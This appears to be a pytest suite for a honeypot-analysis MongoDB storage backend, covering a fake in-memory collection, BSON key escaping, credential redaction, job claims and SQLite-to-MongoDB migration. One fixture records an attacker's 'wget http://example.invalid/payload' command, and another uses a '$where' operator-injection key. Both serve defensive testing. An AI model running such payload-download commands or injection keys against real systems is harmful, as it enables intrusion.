from __future__ import annotations

import copy
import inspect
import json
import os
import re
import uuid
from dataclasses import replace
from functools import cmp_to_key
from pathlib import Path
from typing import Any, Mapping

import pytest

from production.storage.backend import SQLiteStorage, StorageError
from production.storage.contract import StorageBackend
from production.storage.mongodb import (
    INDEX_DEFINITIONS,
    MONGODB_DRIVER_AVAILABLE,
    MONGODB_SCHEMA_VERSION,
    MongoStorage,
    _safe_error,
    from_bson_safe,
    mongodb_dependency_diagnostic,
    to_bson_safe,
)
from production.tools.migrate_sqlite_to_mongodb import (
    SQLiteToMongoMigrator,
    SourceIdentity,
    main,
)


_MISSING = object()


def _get_path(document: Mapping[str, Any], path: str, default: Any = _MISSING) -> Any:
    value: Any = document
    for part in path.split("."):
        if not isinstance(value, Mapping) or part not in value:
            return default
        value = value[part]
    return value


def _set_path(document: dict[str, Any], path: str, value: Any) -> None:
    target = document
    parts = path.split(".")
    for part in parts[:-1]:
        child = target.get(part)
        if not isinstance(child, dict):
            child = {}
            target[part] = child
        target = child
    target[parts[-1]] = copy.deepcopy(value)


def _unset_path(document: dict[str, Any], path: str) -> None:
    target = document
    parts = path.split(".")
    for part in parts[:-1]:
        child = target.get(part)
        if not isinstance(child, dict):
            return
        target = child
    target.pop(parts[-1], None)


def _operator_match(actual: Any, operator: str, expected: Any) -> bool:
    if operator == "$in":
        return actual is not _MISSING and actual in expected
    if operator == "$nin":
        return actual is _MISSING or actual not in expected
    if operator == "$ne":
        return actual is _MISSING or actual != expected
    if operator == "$lt":
        return actual is not _MISSING and actual < expected
    if operator == "$lte":
        return actual is not _MISSING and actual <= expected
    if operator == "$gt":
        return actual is not _MISSING and actual > expected
    if operator == "$gte":
        return actual is not _MISSING and actual >= expected
    if operator == "$exists":
        return (actual is not _MISSING) is bool(expected)
    raise AssertionError(f"fake query operator not implemented: {operator}")


def _matches(document: Mapping[str, Any], query: Mapping[str, Any]) -> bool:
    for key, expected in query.items():
        if key == "$or":
            if not any(_matches(document, clause) for clause in expected):
                return False
            continue
        if key == "$and":
            if not all(_matches(document, clause) for clause in expected):
                return False
            continue
        actual = _get_path(document, key)
        if isinstance(expected, Mapping) and any(
            str(operator).startswith("$") for operator in expected
        ):
            if not all(
                _operator_match(actual, str(operator), operand)
                for operator, operand in expected.items()
            ):
                return False
        elif expected is None:
            if actual is not _MISSING and actual is not None:
                return False
        elif actual is _MISSING or actual != expected:
            return False
    return True


def _compare_values(left: Any, right: Any) -> int:
    if left is _MISSING or left is None:
        return 0 if right is _MISSING or right is None else -1
    if right is _MISSING or right is None:
        return 1
    return (left > right) - (left < right)


def _sort_documents(
    documents: list[dict[str, Any]],
    sort: list[tuple[str, int]],
) -> list[dict[str, Any]]:
    def compare(left: Mapping[str, Any], right: Mapping[str, Any]) -> int:
        for field, direction in sort:
            result = _compare_values(_get_path(left, field), _get_path(right, field))
            if result:
                return result if direction >= 0 else -result
        return 0

    return sorted(documents, key=cmp_to_key(compare))


class FakeResult:
    def __init__(
        self,
        *,
        matched_count: int = 0,
        modified_count: int = 0,
        deleted_count: int = 0,
        upserted_id: Any = None,
    ):
        self.matched_count = matched_count
        self.modified_count = modified_count
        self.deleted_count = deleted_count
        self.upserted_id = upserted_id


class FakeCursor:
    def __init__(self, documents: list[dict[str, Any]]):
        self.documents = [copy.deepcopy(document) for document in documents]

    def sort(self, spec: list[tuple[str, int]]) -> "FakeCursor":
        self.documents = _sort_documents(self.documents, list(spec))
        return self

    def limit(self, value: int) -> "FakeCursor":
        self.documents = self.documents[: max(int(value), 0)]
        return self

    def __iter__(self):
        return iter([copy.deepcopy(document) for document in self.documents])


class FakeCollection:
    def __init__(self, name: str):
        self.name = name
        self.documents: dict[Any, dict[str, Any]] = {}
        self.indexes: list[dict[str, Any]] = []

    def create_index(
        self,
        keys: list[tuple[str, int]],
        *,
        name: str,
        unique: bool = False,
    ) -> str:
        self.indexes.append({"keys": tuple(keys), "name": name, "unique": unique})
        return name

    def _apply_update(
        self,
        document: dict[str, Any],
        update: Mapping[str, Any],
        *,
        inserting: bool,
    ) -> None:
        if not any(str(key).startswith("$") for key in update):
            replacement = copy.deepcopy(dict(update))
            document.clear()
            document.update(replacement)
            return
        if inserting:
            for path, value in update.get("$setOnInsert", {}).items():
                _set_path(document, path, value)
        for path, value in update.get("$set", {}).items():
            _set_path(document, path, value)
        for path in update.get("$unset", {}):
            _unset_path(document, path)
        for path, value in update.get("$inc", {}).items():
            current = _get_path(document, path, 0)
            _set_path(document, path, (0 if current is _MISSING else current) + value)
        for path, value in update.get("$max", {}).items():
            current = _get_path(document, path)
            if current is _MISSING or current < value:
                _set_path(document, path, value)
        for path, value in update.get("$min", {}).items():
            current = _get_path(document, path)
            if current is _MISSING or current > value:
                _set_path(document, path, value)

    def _upsert_base(self, query: Mapping[str, Any]) -> dict[str, Any]:
        document: dict[str, Any] = {}
        for key, value in query.items():
            if key.startswith("$"):
                continue
            if isinstance(value, Mapping) and any(
                str(operator).startswith("$") for operator in value
            ):
                continue
            _set_path(document, key, value)
        return document

    def update_one(
        self,
        query: Mapping[str, Any],
        update: Mapping[str, Any],
        upsert: bool = False,
    ) -> FakeResult:
        for identifier, existing in list(self.documents.items()):
            if _matches(existing, query):
                before = copy.deepcopy(existing)
                self._apply_update(existing, update, inserting=False)
                new_identifier = existing.get("_id", identifier)
                if new_identifier != identifier:
                    self.documents.pop(identifier)
                self.documents[new_identifier] = existing
                return FakeResult(
                    matched_count=1,
                    modified_count=int(before != existing),
                )
        if not upsert:
            return FakeResult()
        document = self._upsert_base(query)
        self._apply_update(document, update, inserting=True)
        identifier = document.get("_id")
        if identifier is None:
            identifier = f"fake-{len(self.documents) + 1}"
            document["_id"] = identifier
        self.documents[identifier] = document
        return FakeResult(modified_count=1, upserted_id=identifier)

    def replace_one(
        self,
        query: Mapping[str, Any],
        replacement: Mapping[str, Any],
        upsert: bool = False,
    ) -> FakeResult:
        for identifier, existing in list(self.documents.items()):
            if _matches(existing, query):
                document = copy.deepcopy(dict(replacement))
                new_identifier = document.get("_id", identifier)
                self.documents.pop(identifier)
                self.documents[new_identifier] = document
                return FakeResult(matched_count=1, modified_count=int(existing != document))
        if not upsert:
            return FakeResult()
        document = copy.deepcopy(dict(replacement))
        identifier = document.get("_id", f"fake-{len(self.documents) + 1}")
        document["_id"] = identifier
        self.documents[identifier] = document
        return FakeResult(modified_count=1, upserted_id=identifier)

    def find_one(
        self,
        query: Mapping[str, Any],
        *args: Any,
        sort: list[tuple[str, int]] | None = None,
        **kwargs: Any,
    ) -> dict[str, Any] | None:
        matches = [
            copy.deepcopy(document)
            for document in self.documents.values()
            if _matches(document, query)
        ]
        if sort:
            matches = _sort_documents(matches, sort)
        return matches[0] if matches else None

    def find(self, query: Mapping[str, Any]) -> FakeCursor:
        return FakeCursor(
            [
                document
                for document in self.documents.values()
                if _matches(document, query)
            ]
        )

    def find_one_and_update(
        self,
        query: Mapping[str, Any],
        update: Mapping[str, Any],
        *,
        sort: list[tuple[str, int]] | None = None,
        return_document: Any = None,
    ) -> dict[str, Any] | None:
        matches = [
            document for document in self.documents.values() if _matches(document, query)
        ]
        if sort:
            matches = _sort_documents(matches, sort)
        if not matches:
            return None
        identifier = matches[0]["_id"]
        before = copy.deepcopy(self.documents[identifier])
        self._apply_update(self.documents[identifier], update, inserting=False)
        return copy.deepcopy(self.documents[identifier] if return_document else before)

    def count_documents(self, query: Mapping[str, Any]) -> int:
        return sum(1 for document in self.documents.values() if _matches(document, query))

    def delete_many(self, query: Mapping[str, Any]) -> FakeResult:
        identifiers = [
            identifier
            for identifier, document in self.documents.items()
            if _matches(document, query)
        ]
        for identifier in identifiers:
            self.documents.pop(identifier)
        return FakeResult(deleted_count=len(identifiers))


class FakeDatabase:
    def __init__(self, name: str = "honeypot_test"):
        self.name = name
        self.collections: dict[str, FakeCollection] = {}

    def __getitem__(self, name: str) -> FakeCollection:
        return self.collections.setdefault(name, FakeCollection(name))

    def command(self, name: str) -> dict[str, int]:
        assert name == "ping"
        return {"ok": 1}


def make_storage() -> tuple[MongoStorage, FakeDatabase]:
    database = FakeDatabase()
    storage = MongoStorage(
        "mongodb://unit-test.invalid/honeypot_test",
        "honeypot_test",
        database=database,
    )
    storage.initialize()
    return storage, database


def test_mongodb_contract_and_exact_indexes() -> None:
    storage, database = make_storage()

    assert isinstance(storage, StorageBackend)
    protocol_methods = {
        name
        for name, value in inspect.getmembers(StorageBackend)
        if callable(value) and not name.startswith("_")
    }
    assert not [name for name in protocol_methods if not callable(getattr(storage, name, None))]

    for table, definitions in INDEX_DEFINITIONS.items():
        actual = {
            (item["name"], item["keys"], item["unique"])
            for item in database[table].indexes
        }
        expected = {
            (definition.name, tuple(definition.keys), definition.unique)
            for definition in definitions
        }
        assert actual == expected

    metadata = database["_storage_metadata"].find_one({"_id": "schema"})
    assert metadata == {
        "_id": "schema",
        "backend": "mongodb",
        "schema_version": MONGODB_SCHEMA_VERSION,
        "updated_at": metadata["updated_at"],
    }
    assert storage.health_check() == {
        "backend": "mongodb",
        "database": "honeypot_test",
        "driver_available": True,
        "ok": True,
        "status": "ok",
    }


def test_optional_driver_diagnostic_is_explicit() -> None:
    diagnostic = mongodb_dependency_diagnostic()
    assert diagnostic["driver"] == "pymongo"
    assert "pymongo>=4.6,<5" in diagnostic["required_spec"]
    if not MONGODB_DRIVER_AVAILABLE:
        with pytest.raises(StorageError, match="install pymongo"):
            MongoStorage("mongodb://example.invalid/honeypot", "honeypot")


def test_bson_key_escape_is_collision_free_and_object_ids_are_outward_safe() -> None:
    ObjectId = type(
        "ObjectId",
        (),
        {
            "__module__": "bson.objectid",
            "__str__": lambda self: "507f1f77bcf86cd799439011",
        },
    )
    original = {
        "$where": "attacker-controlled",
        "%24where": "literal-percent",
        "a.b": {"$nested": 1},
        "a%2Eb": 2,
        "object_id": ObjectId(),
    }
    encoded = to_bson_safe(original)

    assert len(encoded) == len(original)
    assert not any(key.startswith("$") or "." in key for key in encoded)
    assert from_bson_safe(encoded) == {
        **{key: value for key, value in original.items() if key != "object_id"},
        "object_id": "507f1f77bcf86cd799439011",
    }


def test_driver_exception_redaction_removes_credentials() -> None:
    message = _safe_error(
        RuntimeError(
            "cannot connect mongodb://alice:correct-horse@example.invalid:27017/honeypot"
        )
    )
    assert "alice" not in message
    assert "correct-horse" not in message
    assert "mongodb://<redacted>@example.invalid:27017/honeypot" in message

    query_message = _safe_error(
        RuntimeError(
            "cannot connect mongodb://alice:correct-horse@example.invalid/honeypot"
            "?token=query-secret&retry=true"
        )
    )
    assert "query-secret" not in query_message
    assert "?token=" not in query_message

    compound_auth_message = _safe_error(
        RuntimeError(
            "cannot connect mongodb://alice:correct-horse@example.invalid/honeypot"
            "?authMechanismProperties=AWS_SESSION_TOKEN:compound-secret"
        )
    )
    assert "compound-secret" not in compound_auth_message
    assert "authMechanismProperties" not in compound_auth_message


def test_idempotent_events_atomic_claims_and_session_counts() -> None:
    storage, database = make_storage()
    event = {
        "session": "session-1",
        "src_ip": "8.8.8.8",
        "eventid": "cowrie.login.success",
        "$attacker.key": "preserved",
    }

    event_id, created = storage.store_event("pi-1", event)
    repeated_id, repeated_created = storage.store_event("pi-1", event)
    assert repeated_id == event_id
    assert created is True
    assert repeated_created is False
    assert storage.fetch_unprocessed_events(10)[0]["event"] == event

    for session_id, ended in (("session-1", True), ("session-2", False)):
        storage.save_session(
            {
                "session_id": session_id,
                "src_ip": "8.8.8.8",
                "session_source": "production_live",
                "is_ended": ended,
            }
        )
        storage.enqueue_analysis_job(
            {"session_id": session_id, "src_ip": "8.8.8.8"}
        )

    first_claim = storage.claim_analysis_jobs(1)
    second_claim = storage.claim_analysis_jobs(10)
    assert len(first_claim) == 1
    assert len(second_claim) == 1
    assert first_claim[0]["job_id"] != second_claim[0]["job_id"]
    assert first_claim[0]["attempts"] == second_claim[0]["attempts"] == 1
    assert storage.claim_analysis_jobs(10) == []
    assert storage.count_sessions() == 2
    assert storage.count_sessions(ended_only=True) == 1
    assert storage.count_sessions(external_only=True) == 2

    storage.mark_event_processed(event_id)
    assert storage.fetch_events(processed=True)[0]["processed"] is True
    assert all(
        document["schema_version"] == MONGODB_SCHEMA_VERSION
        for name, collection in database.collections.items()
        if not name.startswith("_")
        for document in collection.documents.values()
    )


def test_priority_claim_sighting_deduplication_and_webhook_idempotency() -> None:
    storage, database = make_storage()
    low_id, _ = storage.enqueue_enrichment_job(
        "ip",
        "8.8.8.8",
        priority="low",
    )
    high_id, _ = storage.enqueue_enrichment_job(
        "ip",
        "1.1.1.1",
        priority="high",
    )
    storage.enqueue_enrichment_job(
        "ip",
        "8.8.8.8",
        priority="urgent",
        priority_reason="confirmed attack",
    )
    claimed = storage.claim_enrichment_jobs(2)
    assert [item["job_id"] for item in claimed] == [low_id, high_id]
    assert claimed[0]["priority"] == "urgent"
    assert claimed[0]["priority_reason"] == "confirmed attack"

    sighting = {
        "observable_type": "ip",
        "observable_value": "8.8.8.8",
        "session_id": "session-1",
        "role": "source",
        "source": "cowrie",
    }
    sighting_id = storage.record_observable_sighting(sighting)
    assert storage.record_observable_sighting(sighting) == sighting_id
    observable = database["observables"].find_one(
        {"observable_type": "ip", "observable_value": "8.8.8.8"}
    )
    assert observable["sighting_count"] == 1

    alert_id = storage.store_alert({"session_id": "session-1", "severity": "HIGH"})
    delivery_id = storage.record_webhook_delivery(
        {"alert": "payload"},
        "target-hash",
        "failed",
        alert_id=alert_id,
    )
    assert (
        storage.record_webhook_delivery(
            {"alert": "payload"},
            "target-hash",
            "delivered",
            alert_id=alert_id,
        )
        == delivery_id
    )
    delivery = storage.get_webhook_delivery(delivery_id)
    assert delivery["attempts"] == 2
    assert database["alerts"].find_one({"alert_id": alert_id})["delivered"] is True


def test_critical_entity_parity_across_reports_predictions_campaigns_and_feedback() -> None:
    storage, _ = make_storage()
    storage.save_session(
        {
            "session_id": "session-report",
            "src_ip": "8.8.4.4",
            "session_source": "production_live",
            "is_ended": True,
        }
    )
    job_id = storage.enqueue_analysis_job(
        {"session_id": "session-report", "src_ip": "8.8.4.4"}
    )
    assert storage.claim_analysis_jobs(1)[0]["job_id"] == job_id
    report_id = storage.complete_analysis_job(
        job_id,
        {"session_id": "session-report", "summary": {"severity": "high"}},
    )
    reports = storage.list_rows("reports")
    assert reports[0]["report_id"] == report_id
    assert json.loads(reports[0]["payload_json"])["summary"]["severity"] == "high"
    assert storage.list_rows_for_session("reports", "session-report")[0]["report_id"] == report_id
    assert storage.list_rows_for_session("reports", "different-session") == []
    with pytest.raises(ValueError, match="session-scoped"):
        storage.list_rows_for_session("campaigns", "session-report")
    assert storage.get_session("session-report")["payload"]["analysis_status"] == "succeeded"

    storage.save_enrichment_record(
        "ip",
        "8.8.4.4",
        {"asn": 15169},
        {"rdap": {"status": "ok"}},
        expires_at="2999-01-01T00:00:00+00:00",
    )
    assert storage.load_enrichment_cache("ip", allow_stale=False)["8.8.4.4"]["asn"] == 15169

    storage.save_campaign(
        {
            "campaign_id": "campaign-1",
            "hassh_fingerprint": "hassh-value",
            "session_count": 1,
            "confirmed_tactics": ["credential-access"],
            "first_seen": "2026-01-01T00:00:00+00:00",
            "last_seen": "2026-01-02T00:00:00+00:00",
        }
    )
    _, created = storage.link_campaign_session(
        "campaign-1",
        "session-report",
        match_reasons=["hassh"],
        confidence=0.9,
    )
    assert created is True
    assert storage.count_campaign_sessions("campaign-1") == 1
    membership = storage.list_session_campaigns("session-report")[0]
    assert membership["campaign_id"] == "campaign-1"
    assert membership["match_reasons"] == ["hassh"]
    assert membership["campaign_payload"]["confirmed_tactics"] == ["credential-access"]

    protected_snapshot = storage.save_prediction_snapshot(
        {
            "snapshot_id": "snapshot-protected",
            "session_id": "session-report",
            "src_ip": "8.8.4.4",
            "generated_at": "2020-01-01T00:00:00+00:00",
        }
    )
    latest_snapshot = storage.save_prediction_snapshot(
        {
            "snapshot_id": "snapshot-latest",
            "session_id": "session-report",
            "src_ip": "8.8.4.4",
            "generated_at": "2026-07-01T00:00:00+00:00",
        }
    )
    storage.save_prediction_snapshot(
        {
            "snapshot_id": "snapshot-delete",
            "session_id": "session-delete",
            "src_ip": "1.1.1.1",
            "generated_at": "2020-01-01T00:00:00+00:00",
        }
    )
    storage.save_prediction_snapshot(
        {
            "snapshot_id": "snapshot-delete-latest",
            "session_id": "session-delete",
            "src_ip": "1.1.1.1",
            "generated_at": "2026-07-01T00:00:00+00:00",
        }
    )
    feedback_id = storage.record_analyst_feedback(
        {
            "session_id": "session-report",
            "snapshot_id": protected_snapshot,
            "label": "useful",
            "notes": "protect the reviewed snapshot",
        }
    )
    assert storage.list_rows("analyst_feedback")[0]["feedback_id"] == feedback_id
    assert storage.get_latest_prediction_snapshot("session-report")["snapshot_id"] == latest_snapshot
    assert storage.get_prediction_snapshot(protected_snapshot)["snapshot_id"] == protected_snapshot
    pruned = storage.prune_prediction_snapshots(
        retention_days=90,
        now="2026-07-16T00:00:00+00:00",
    )
    assert pruned["deleted"] == 1
    remaining = {
        row["snapshot_id"] for row in storage.list_rows("prediction_snapshots", limit=20)
    }
    assert protected_snapshot in remaining
    assert latest_snapshot in remaining
    assert "snapshot-delete" not in remaining

    label_id = storage.record_classification_review_label(
        {
            "session_id": "session-report",
            "command": "wget http://example.invalid/payload",
            "reviewed_tactic": "command-and-control",
        }
    )
    labels = storage.list_classification_review_labels()
    assert labels[0]["label_id"] == label_id
    assert labels[0]["payload"]["reviewed_tactic"] == "command-and-control"


def test_sqlite_to_mongodb_migration_is_resumable_and_validated(tmp_path: Path) -> None:
    source_path = tmp_path / "source.db"
    sqlite_storage = SQLiteStorage(f"sqlite:///{source_path}")
    sqlite_storage.initialize()
    sqlite_storage.store_event(
        "pi-1",
        {
            "session": "session-1",
            "src_ip": "8.8.8.8",
            "eventid": "cowrie.session.connect",
            "$unsafe.key": {"nested.dot": True},
        },
    )
    sqlite_storage.save_session(
        {
            "session_id": "session-1",
            "src_ip": "8.8.8.8",
            "session_source": "production_live",
            "is_ended": True,
        }
    )
    sqlite_storage.store_alert(
        {"alert_id": "alert-1", "session_id": "session-1", "severity": "HIGH"}
    )
    source_before = source_path.read_bytes()

    target, _ = make_storage()
    migrator = SQLiteToMongoMigrator(
        source_path,
        target,
        migration_id="unit-migration",
        batch_size=1,
        sample_size=1,
        tables=("events", "sessions", "alerts"),
    )
    first = migrator.run()
    assert first["ok"] is True
    assert first["source_deleted"] is False
    assert [item["processed_this_run"] for item in first["tables"]] == [1, 1, 1]
    assert all(item["validation"]["ok"] for item in first["tables"])
    assert first["counters"]["inserted"] == 3
    assert all(
        sample["expected_sha256"] == sample["actual_sha256"]
        for item in first["tables"]
        for sample in item["validation"]["sample_hashes"]
    )

    resumed = migrator.run()
    assert resumed["ok"] is True
    assert [item["processed_this_run"] for item in resumed["tables"]] == [0, 0, 0]
    assert target.count_collection("events") == 1
    assert target.count_collection("sessions") == 1
    assert target.count_collection("alerts") == 1
    assert source_path.read_bytes() == source_before


def test_migration_refuses_changed_source_until_restart(tmp_path: Path) -> None:
    source_path = tmp_path / "changing-source.db"
    sqlite_storage = SQLiteStorage(f"sqlite:///{source_path}")
    sqlite_storage.initialize()
    sqlite_storage.store_event(
        "pi-1",
        {"session": "one", "src_ip": "8.8.8.8", "eventid": "cowrie.session.connect"},
    )
    target, _ = make_storage()
    migrator = SQLiteToMongoMigrator(
        source_path,
        target,
        migration_id="changed-source",
        tables=("events",),
    )
    assert migrator.run()["ok"] is True

    sqlite_storage.store_event(
        "pi-1",
        {"session": "two", "src_ip": "1.1.1.1", "eventid": "cowrie.session.connect"},
    )
    refused = migrator.run()
    assert refused["ok"] is False
    assert refused["tables"][0]["status"] == "failed"
    assert "--restart" in refused["tables"][0]["failures"][0]["error"]
    assert target.count_collection("events") == 1

    restarted = SQLiteToMongoMigrator(
        source_path,
        target,
        migration_id="changed-source",
        tables=("events",),
        restart=True,
    ).run()
    assert restarted["ok"] is True
    assert restarted["checkpoints_cleared"] == 1
    assert restarted["counters"] == {
        "inserted": 1,
        "updated": 0,
        "skipped": 1,
        "duplicate": 0,
        "invalid": 0,
        "failed": 0,
    }
    assert target.count_collection("events") == 2


def test_migration_dry_run_needs_no_mongodb_driver(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    source_path = tmp_path / "dry-run.db"
    sqlite_storage = SQLiteStorage(f"sqlite:///{source_path}")
    sqlite_storage.initialize()
    sqlite_storage.store_event(
        "pi-1",
        {"session": "s", "src_ip": "8.8.8.8", "eventid": "cowrie.session.connect"},
    )

    status = main(
        [
            "--sqlite",
            str(source_path),
            "--tables",
            "events",
            "--batch-size",
            "1",
            "--dry-run",
        ]
    )
    report = json.loads(capsys.readouterr().out)
    assert status == 0
    assert report["ok"] is True
    assert report["dry_run"] is True
    assert report["source_deleted"] is False
    assert report["tables"][0]["validation"]["performed"] is False
    assert report["counters"]["skipped"] == 1


def test_migration_detects_source_change_during_snapshot(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    source_path = tmp_path / "source-change-during-run.db"
    sqlite_storage = SQLiteStorage(f"sqlite:///{source_path}")
    sqlite_storage.initialize()
    sqlite_storage.store_event(
        "pi-1",
        {"session": "s", "src_ip": "8.8.8.8", "eventid": "cowrie.session.connect"},
    )
    migrator = SQLiteToMongoMigrator(
        source_path,
        None,
        tables=("events",),
        dry_run=True,
    )
    original = SourceIdentity.from_path
    calls = 0

    def changing_identity(cls: type[SourceIdentity], path: Path) -> SourceIdentity:
        nonlocal calls
        calls += 1
        identity = original(path)
        return replace(identity, modified_ns=identity.modified_ns + 1) if calls == 2 else identity

    monkeypatch.setattr(SourceIdentity, "from_path", classmethod(changing_identity))
    report = migrator.run()
    assert report["ok"] is False
    assert report["source_changed_during_run"] is True
    assert report["failures"][-1]["stage"] == "source_changed_during_run"


def test_real_mongodb_event_dedupe_and_indexes_when_explicitly_configured() -> None:
    uri = os.getenv("MONGODB_TEST_URI", "").strip()
    if not uri:
        pytest.skip(
            "real MongoDB integration not run: set MONGODB_TEST_URI to an authorized private test server"
        )
    base = os.getenv("MONGODB_TEST_DATABASE", "honeypot_analysis_test").strip()
    safe_base = re.sub(r"[^A-Za-z0-9_-]", "_", base)[:40] or "honeypot_analysis_test"
    database_name = f"{safe_base}_{uuid.uuid4().hex}"
    storage: MongoStorage | None = None
    try:
        storage = MongoStorage(uri, database_name)
        storage.initialize()
        assert storage.health_check()["ok"] is True
        event = {
            "session": "real-integration-session",
            "src_ip": "192.0.2.10",
            "eventid": "cowrie.session.connect",
        }
        event_id, created = storage.store_event("integration-sensor", event)
        repeated_id, repeated_created = storage.store_event("integration-sensor", event)
        assert repeated_id == event_id
        assert created is True
        assert repeated_created is False
        assert storage.count_collection("events") == 1
        for table, definitions in INDEX_DEFINITIONS.items():
            index_information = storage.database[table].index_information()
            for definition in definitions:
                assert definition.name in index_information
                assert bool(index_information[definition.name].get("unique", False)) is definition.unique
    finally:
        if storage is not None:
            # The name is generated in this test and cannot refer to a
            # pre-existing database supplied by the URI.
            storage.client.drop_database(database_name)
